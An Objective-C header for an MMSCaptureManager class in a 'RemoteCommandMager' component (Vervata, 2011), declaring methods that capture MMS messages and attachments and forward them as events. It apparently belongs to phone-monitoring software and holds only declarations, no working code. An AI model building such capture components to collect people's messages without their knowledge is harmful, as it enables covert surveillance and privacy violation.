/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  MMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "EventDelegate.h"
#import "MessagePortIPCReader.h"

@protocol TelephonyNotificationManager;
@class MMSNotifier;
@class MMSCaptureUtils;

@interface MMSCaptureManager : NSObject <MessagePortIPCDelegate> {
@private
	//For creatinn an instance of MessagePortIPCReader
    MessagePortIPCReader*	mMessagePortIPCReader; 
	id <EventDelegate>		mEventDelegate;
	NSString				*mMMSAttachmentPath;
	MMSCaptureUtils				*mMMSUtils;
	
	// IOS 6
	NSMutableArray		*mMMSEventPool;
	MMSNotifier			*mMMSNotifier;
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
}

@property (nonatomic, copy) NSString *mMMSAttachmentPath;
@property (nonatomic, assign) id <TelephonyNotificationManager> mTelephonyNotificationManager;

//For Sending event to Event Delivery manager
- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;
//These methods for controlling MMS capture
- (void) startCapture;
- (void) stopCapture;

@end
